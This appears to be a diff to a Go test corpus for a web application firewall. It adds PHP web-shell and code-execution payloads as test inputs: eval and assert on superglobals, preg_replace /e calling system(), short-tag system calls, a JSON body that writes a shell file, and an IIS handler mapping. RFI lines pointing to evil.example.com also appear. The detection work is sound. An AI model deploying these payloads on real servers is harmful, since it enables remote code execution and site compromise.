@@ -487,6 +487,35 @@ var evasions = []evasion{
 	{name: "phpeval/create_function", technique: "none", arg: "create_function('$x','eval($x);')"},
 	{name: "phpeval/rot13 dropper", technique: "none", arg: "eval(str_rot13('flfgrz'))"},
 
+	// eval and assert fed a superglobal directly. China Chopper is written with
+	// the error-suppressing "@", and matching only that shape missed the same
+	// shell without it -- "eval($_POST['x'])" is a complete web shell.
+	{name: "phpeval/eval superglobal", technique: "none", arg: "eval($_POST['x'])"},
+	{name: "phpeval/assert superglobal", technique: "none", arg: "assert($_GET['c'])"},
+	{name: "phpeval/assert request", technique: "none", arg: "assert($_REQUEST['c'])"},
+
+	// preg_replace's /e modifier evaluated the replacement as PHP. It was
+	// removed in PHP 7, which is exactly why it still matters: the WordPress
+	// installs that never upgraded are the ones being mass-compromised. Any
+	// pattern carries the modifier, not just the ".*" the first literal spelled.
+	{name: "phpeval/preg_replace e capture", technique: "none",
+		arg: `preg_replace('/(.*)/e','system($_GET[c])','x')`},
+	{name: "phpeval/preg_replace e short", technique: "none",
+		arg: `preg_replace("/x/e",$_GET[c],'x')`},
+
+	// The PHP short echo tag. "<?=" opens code in every PHP since 5.4, and
+	// matching only "<?=$" missed every payload that echoes a call rather than
+	// a variable.
+	// PHP code delivered as data. This is a different class from dynamic
+	// evaluation: nothing here calls eval, the payload *is* source, written to
+	// disk by an origin that trusted the field and then requested back.
+	{name: "phpcode/short echo call", technique: "none", arg: "<?=system('id')?>"},
+	{name: "phpcode/short echo backtick", technique: "none", arg: "<?=`id`?>"},
+	{name: "phpcode/long tag", technique: "none", arg: "<?php system($_GET['cmd']); ?>"},
+	{name: "phpcode/asp style tag", technique: "none", arg: "<%php system('id'); %>"},
+	{name: "phpcode/tag in json body", technique: "body",
+		body: `{"avatar":"<?php file_put_contents('s.php',$_GET['c']); ?>"}`},
+
 	// ---- remote file inclusion ----------------------------------------------
 	{name: "rfi/timthumb", technique: "none", arg: "http://evil.example.com/shell.php"},
 	{name: "rfi/query truncation", technique: "none", arg: "http://evil.example.com/shell.php?"},
@@ -531,6 +560,10 @@ var evasions = []evasion{
 		body: `{"content":"php_value auto_prepend_file /tmp/x"}`},
 	{name: "htaccess/exec cgi", technique: "body",
 		body: `{"content":"Options +ExecCGI\nSetHandler cgi-script"}`},
+	// The IIS form of the same attack: a web.config uploaded beside the payload
+	// maps an innocuous extension to an interpreter binary.
+	{name: "htaccess/iis scriptprocessor", technique: "body",
+		body: `{"content":"<handlers><add name=\"x\" path=\"*.jpg\" scriptProcessor=\"asp.dll\"/></handlers>"}`},
 }
 
 // urlEncodeQ percent-encodes a GraphQL document for the GET form the
@@ -870,6 +903,7 @@ var declaredClasses = map[string]int{
 	"elinj":     5,
 	"gadget":    3,
 	"phpeval":   5,
+	"phpcode":   5,
 	"rfi":       4,
 	"crlf":      3,
 	"upload":    9,
